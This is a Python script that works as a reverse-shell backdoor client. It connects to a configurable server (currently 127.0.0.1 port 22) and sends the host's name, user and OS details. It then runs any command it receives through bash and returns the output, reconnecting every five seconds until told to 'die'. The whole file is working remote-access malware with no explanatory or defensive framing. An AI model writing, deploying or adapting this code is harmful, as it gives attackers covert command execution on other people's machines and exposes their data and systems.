import socket
import subprocess
import time
import os
import getpass

SERVER_IP = "127.0.0.1"
SERVER_PORT = 22

def get_system_info():
    try:
        hostname = subprocess.check_output("hostname", shell=True).decode().strip()
        username = getpass.getuser()
        uname_output = subprocess.check_output("uname -a", shell=True).decode().strip()

        parts = uname_output.split()
        os_name = parts[1]  # "kali"
        version = parts[2].split("-")[0]  # "6.12.20"
        arch = parts[-2]  # "x86_64"

        os_info = f"{os_name},{version},{arch}"
        return hostname, username, os_info
    except Exception:
        return "Unknown", "Unknown", "Unknown,Unknown,Unknown"


def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))

            hostname, username, os_info = get_system_info()
            sock.send(f"{hostname},{username},{os_info}".encode())


            should_continue = shell(sock)
            sock.close()
            if not should_continue:
                break
        except Exception:
            time.sleep(5)

def shell(sock):
    current_directory = os.getcwd()

    while True:
        try:
            command = sock.recv(4096).decode().strip()
            if not command:
                break

            if command.startswith("cd "):
                path = command[3:].strip()
                try:
                    if os.path.isabs(path):
                        os.chdir(path)
                    else:
                        os.chdir(os.path.join(os.getcwd(), path))
                    current_directory = os.getcwd()
                    #sock.send(f"Changed directory to {current_directory}\n".encode())
                except FileNotFoundError:
                    sock.send(f"Error: No such directory: {path}\n".encode())
                except Exception as e:
                    sock.send(f"Error: {str(e)}\n".encode())
                try:
                    sock.send(b"__END__")
                except:
                    pass
                continue

            if command == "die":
                return False

            proc = subprocess.Popen(
                command,
                shell=True,
                executable="/bin/bash",
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            output = ""
            for line in proc.stdout:
                output += line

            if output:
                try:
                    sock.send(output.encode())
                except:
                    break

            try:
                sock.send(b"__END__")
            except:
                pass

        except Exception as e:
            try:
                sock.send(f"Error: {e}\n".encode())
                sock.send(b"__END__")
            except:
                pass
            break

    return True

if __name__ == "__main__":
    connect()
